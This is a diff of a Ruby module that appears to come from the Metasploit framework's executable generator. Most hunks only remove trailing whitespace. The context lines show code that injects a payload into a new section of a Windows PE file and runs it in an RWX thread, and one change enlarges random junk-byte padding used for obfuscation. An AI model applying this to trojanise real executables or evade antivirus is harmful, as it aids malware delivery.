@@ -90,7 +90,7 @@ require 'metasm'
 				raise RuntimeError, "Junk at end of file. Is this a packed exe?"
 			end
 
-			#find first section file offset and free RVA for new section 
+			#find first section file offset and free RVA for new section
 			free_rva = pe.hdr.opt.AddressOfEntryPoint
 			first_off = fsize
 			pe.sections.each do |sec|
@@ -103,12 +103,12 @@ require 'metasm'
 			#See if we can add a section
 			first_sechead_file_off = pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + pe.hdr.file.SizeOfOptionalHeader
 			new_sechead_file_off = first_sechead_file_off + pe.hdr.file.NumberOfSections * Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER
-			if new_sechead_file_off + Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER > first_off	
+			if new_sechead_file_off + Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER > first_off
 				raise RuntimeError, "Not enough room for new section header"
 			end
 
 			# figure out where in the new section to put the start. Right now just putting at the beginning of the new section
-			start_rva = free_rva 
+			start_rva = free_rva
 
 			#make new section, starting at free RVA
 			new_sec = win32_rwx_exec_thread(code, pe.hdr.opt.AddressOfEntryPoint - start_rva)
@@ -1046,8 +1046,8 @@ require 'metasm'
 
 	# This wrapper is responsible for allocating RWX memory, copying the
 	# target code there, setting an exception handler that calls ExitProcess,
-	# starting the code in a new thread, and finally jumping back to the next 
-	# code to execute. block_offset is the offset of the next code from 
+	# starting the code in a new thread, and finally jumping back to the next
+	# code to execute. block_offset is the offset of the next code from
 	# the start of this code
 	def self.win32_rwx_exec_thread(code, block_offset)
 
@@ -1194,7 +1194,7 @@ require 'metasm'
 
 		exitblock:
 		#{stub_exit}
-		
+
 		set_handler:
 		  xor eax,eax
 ;		  push dword [fs:eax]
@@ -1208,9 +1208,9 @@ require 'metasm'
 		  push 0x160D6838        ; hash( "kernel32.dll", "CreateThread" )
 		  call ebp               ; Spawn payload thread
 
-		  pop eax                ; Skip 
-;		  pop eax                ; Skip 
-		  pop eax                ; Skip 
+		  pop eax                ; Skip
+;		  pop eax                ; Skip
+		  pop eax                ; Skip
 		  popad                  ; Get our registers back
 ;		  sub esp, 44             ; Move stack pointer back past the handler
 		^
@@ -1247,7 +1247,7 @@ require 'metasm'
 				cnt_jmp += 1
 
 				wrapper << "jmp autojump#{cnt_jmp}\n"
-				1.upto(rand(8)+1) do
+				1.upto(rand(8)+10) do
 					wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
 					cnt_nop -= 1
 				end
@@ -1273,3 +1273,4 @@ require 'metasm'
 end
 end
 end
+
